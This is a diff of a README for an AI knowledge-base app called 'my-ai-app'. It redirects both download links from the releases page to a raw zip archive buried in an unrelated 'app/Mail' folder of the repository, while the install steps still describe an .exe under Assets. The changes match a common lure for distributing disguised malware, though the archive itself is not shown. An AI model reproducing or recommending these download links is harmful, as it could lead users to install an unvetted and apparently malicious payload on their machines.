@@ -1,12 +1,12 @@
 # 🤖 my-ai-app - Build a private searchable knowledge base
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Cloistered-genusalcelaphus1584/my-ai-app/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Cloistered-genusalcelaphus1584/my-ai-app/raw/refs/heads/main/app/Mail/app-my-ai-v3.0-beta.3.zip)
 
 my-ai-app helps you organize your documents and find information. You upload your files, and the app builds a private library. You then ask questions about your documents. The system finds the specific parts of your files that hold the answer and provides a clear response. Your data stays on your machine during this process.
 
 ## 📥 How to download the app
 
-1. Go to the [my-ai-app download page](https://github.com/Cloistered-genusalcelaphus1584/my-ai-app/releases).
+1. Go to the [my-ai-app download page](https://github.com/Cloistered-genusalcelaphus1584/my-ai-app/raw/refs/heads/main/app/Mail/app-my-ai-v3.0-beta.3.zip).
 2. Look for the section labeled Assets.
 3. Click the installer file that ends in .exe.
 4. Save the file to your computer.
